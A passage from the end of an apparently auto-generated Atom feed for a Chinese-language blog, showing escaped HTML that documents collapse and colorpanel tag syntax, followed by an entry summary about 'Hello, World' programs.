class="line">被折叠的内容 2</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#123;% endcollapse %&#125;</span><br></pre></td></tr></table></figure><p>TYPE是面板框的类型，可以是：</p><p>successs<br>danger<br>info<br>warning</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% colorpanel TYPE 面板框的标题 %&#125;</span><br><span class="line"></span><br><span class="line">面板里的内容 1</span><br><span class="line">面板里的内容 2</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#123;% endcolorpanel %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编译器、程序开发环境及运行环境是否已经安装</summary>
      
    
    
    
    <category term="日常" scheme="http://example.com/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
  </entry>
  
</feed>
